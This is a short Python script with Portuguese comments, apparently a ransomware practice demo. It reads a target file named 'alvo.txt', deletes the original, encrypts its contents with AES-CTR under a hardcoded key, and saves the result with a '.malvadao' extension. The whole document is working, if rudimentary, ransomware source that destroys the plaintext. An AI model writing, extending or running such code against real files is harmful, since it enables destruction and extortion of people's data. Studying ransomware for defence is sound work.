import os
import pyaes


## para abrir o arquivo para ser criptografado

file_name = 'alvo.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()


## para remover o arquivo original

os.remove(file_name)


## para definir a chave de encriptacao

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografando o arquivo

crypto_data = aes.encrypt(file_data)

## salvando o arquivo criptografado

new_file = file_name + '.malvadao'
new_file = open (f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()

